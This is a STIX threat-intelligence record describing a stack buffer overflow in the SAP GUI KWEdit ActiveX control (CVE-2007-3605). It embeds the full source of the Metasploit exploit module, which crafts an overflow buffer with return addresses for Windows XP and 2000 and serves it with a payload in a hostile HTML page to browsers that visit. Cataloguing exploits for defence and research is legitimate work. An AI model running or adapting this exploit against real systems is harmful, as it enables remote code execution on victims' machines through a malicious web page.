{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5f311529-4568-4d2b-a0c3-19f4835581f2",
    "created": "2024-08-14T16:44:28.299636Z",
    "modified": "2024-08-14T16:44:28.29964Z",
    "name": "EnjoySAP SAP GUI ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in SAP KWEdit ActiveX Control (kwedit.dll 6400.1.1.41) provided by EnjoySAP GUI. By sending an overly long string to the \"PrepareToPostHTML()\" method, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/enjoysapgui_preparetoposthtml.rb",
            "external_id": "enjoysapgui_preparetoposthtml.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-3605"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'EnjoySAP SAP GUI ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in SAP KWEdit ActiveX\n        Control (kwedit.dll 6400.1.1.41) provided by EnjoySAP GUI. By sending\n        an overly long string to the \"PrepareToPostHTML()\" method, an attacker\n        may be able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-3605' ],\n          [ 'OSVDB', '37690' ],\n          [ 'BID', '24772' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 800,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad } ],\n          [ 'Windows 2000 Pro English All',   { 'Ret' => 0x75022ac4 } ],\n\n        ],\n      'DisclosureDate' => '2007-07-05',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname\t= rand_text_alpha(rand(100) + 1)\n    strname\t= rand_text_alpha(rand(100) + 1)\n\n    # Build the exploit buffer\n    sploit =  rand_text_alpha(1036) + Rex::Arch::X86.jmp_short(6)\n    sploit << make_nops(2) + [target.ret].pack('V') + p.encoded\n\n    # Build out the message\n    content = %Q|<html>\n<object classid='clsid:2137278D-EF5C-11D3-96CE-0004AC965257' id='#{vname}' /></object>\n<script language='javascript'>\n#{strname} = new String('#{sploit}')\n#{vname}.PrepareToPostHTML(#{strname})\n</script>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-07-05",
    "x_mitre_platforms": [
        "win'"
    ]
}